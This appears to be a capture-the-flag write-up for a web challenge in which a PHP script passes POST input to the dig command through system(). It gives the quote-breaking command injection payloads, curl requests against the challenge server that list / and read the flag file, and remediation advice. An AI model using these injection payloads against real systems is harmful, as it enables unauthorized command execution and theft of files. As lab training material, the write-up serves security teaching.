A web utility that executes the dig command to query domain records. Can you break out of the command syntax and hijack the shell?

TL;DR
Dig is a web security challenge that explores OS Command Injection. The application takes a domain name from a POST parameter and executes system("dig '" . $_POST['name'] . "';") . Because the parameter is placed inside single quotes without proper escaping, an attacker can supply a closing single quote followed by arbitrary shell commands ( '; bash -c "..."; # ) to execute arbitrary commands and retrieve the flag.

Source Code Analysis

The core application code is concise:

1

<?= system("dig '" . $_POST['name'] . "';") ?>

Mechanisms

  1. The client submits a POST request containing the name parameter.
  2. The server wraps the input in single quotes ( ' ) and prefixes it with the dig command.
  3. The concatenated string is passed directly into PHP’s system() execution handler:
1

   dig '<user_input>';

Vulnerability Identification

The script is vulnerable to OS Command Injection:

  • Although the developer wrapped the input within single quotes ( ' ) to prevent whitespace argument injection, user-controlled input is not escaped with escapeshellarg() or escapeshellcmd() .
  • An attacker who inputs a single quote ( ' ) will prematurely close the quoted string argument, allowing semicolons ( ; ), logical operators ( && , || ), or command substitutions ( $() ) to execute additional commands.

Exploitation

1. Escaping the Shell Command

To inject arbitrary commands, we structure our payload as follows:

1

'; <injected_command>; #

When evaluated by bash:

1

dig ''; <injected_command>; #';
  • '; terminates the dig command with an empty string argument.
  • <injected_command>; executes our arbitrary system command.
  • # (or an opening quote ' ) comments out the trailing semicolon and single quote generated by the PHP script.

2. Reconnaissance via Injected Commands

We query the root filesystem to locate the flag file:

1
2

curl -s -X POST "https://chall.nckuctf.org:28113/" \
  -d "name='; ls -la /; #"

The output reveals a randomly named flag file in / :

1
2
3
4

drwxr-xr-x   1 root root 4096 Apr 26 04:30 ..
-r--------   1 root root   27 Apr 26 04:30 flag_n2i3na
drwxr-xr-x   2 root root 4096 Mar 12 12:00 bin
...

3. Capturing the Flag

We read /flag_n2i3na using cat :

1
2

curl -s -X POST "https://chall.nckuctf.org:28113/" \
  -d "name='; bash -c \"cat /flag_n2i3na\"; #" | grep -oP "NCKUCTF\{.*?\}"

Output:

1

NCKUCTF{d19_70015_15_n1c3!}

Flags 

1

NCKUCTF{d19_70015_15_n1c3!}

Remediation

  1. Avoid System Shell Execution: Where possible, use native language libraries (e.g., PHP’s dns_get_record() ) rather than executing shell binaries.
  2. Proper Shell Escaping: If invoking system commands is necessary, sanitize all arguments using escapeshellarg() :
1
2

   $domain = escapeshellarg($_POST['name']);
   system("dig $domain");
  1. Strict Input Validation: Enforce regex patterns matching valid domain names before passing input to execution:
1
2
3

   if (!preg_match('/^[a-zA-Z0-9.-]+$/', $_POST['name'])) {
       die('Invalid domain format.');
   }
